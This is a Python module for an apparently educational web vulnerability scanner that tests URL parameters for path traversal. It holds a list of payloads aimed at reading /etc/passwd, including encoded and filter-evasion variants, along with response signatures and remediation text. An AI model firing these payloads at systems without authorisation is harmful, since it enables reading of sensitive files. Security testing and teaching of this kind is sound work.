"""
Module: Directory Traversal / Path Traversal Scanner
Tests for path traversal vulnerabilities in URL parameters.

What you'll learn:
  - How path traversal lets attackers read arbitrary files (e.g. /etc/passwd)
  - Why "../" sequences in file parameters are dangerous
  - How OS-level file access maps to web app vulnerabilities
  - Encoding tricks attackers use to bypass naive filters
"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.report import Finding

# Traversal sequences — varying depth and encoding
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",          # URL encoded
    "..%252F..%252F..%252Fetc%252Fpasswd",   # Double URL encoded
    "....//....//....//etc/passwd",           # Filter evasion
    "..\\..\\..",                             # Windows backslash
    "..%5C..%5C..%5Cetc%5Cpasswd",           # Windows URL encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", # All encoded
]

# Signatures that indicate a successful /etc/passwd read
UNIX_SIGNATURES = [
    "root:x:0:0",
    "root:*:0:0",
    "/bin/bash",
    "/bin/sh",
    "daemon:x:",
]

# Parameters commonly used for file inclusion
FILE_PARAMS = [
    "file", "page", "include", "path", "template", "doc",
    "document", "load", "view", "content", "lang", "module",
    "conf", "config", "layout", "filename",
]


class DirTraversalScanner:
    MODULE = "traversal"

    def __init__(self, client, verbose: bool = False):
        self.client = client
        self.verbose = verbose

    def _is_traversal_success(self, body: str) -> bool:
        """Check if response body contains file read signatures."""
        for sig in UNIX_SIGNATURES:
            if sig in body:
                return True
        return False

    def run(self) -> list:
        findings = []
        base_url = self.client.base_url
        parsed_base = urlparse(base_url)
        existing_params = parse_qs(parsed_base.query)

        params_to_test = set(existing_params.keys()) | set(FILE_PARAMS)

        for param in params_to_test:
            for payload in TRAVERSAL_PAYLOADS:
                test_params = dict(existing_params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                path_and_query = parsed_base.path + ("?" + new_query if new_query else "")

                response = self.client.get(path_and_query)
                if response is None:
                    continue

                if self._is_traversal_success(response.text):
                    print(f"  [!] Directory Traversal in param '{param}' with: {payload}")
                    findings.append(Finding(
                        module=self.MODULE,
                        severity="HIGH",
                        title=f"Directory Traversal in parameter '{param}'",
                        detail=(
                            f"Path traversal allowed reading system files (e.g. /etc/passwd). "
                            f"Attacker can read sensitive config files, credentials, and source code. "
                            f"Fix: Validate and canonicalize file paths; never pass user input directly to file open calls."
                        ),
                        evidence=f"Param: {param!r} | Payload: {payload!r} | Response contained /etc/passwd content",
                    ))
                    return findings  # Critical — stop after first confirmed finding

            if self.verbose:
                print(f"  [+] No traversal detected for param: {param}")

        if not findings:
            print("  [+] No directory traversal detected.")

        return findings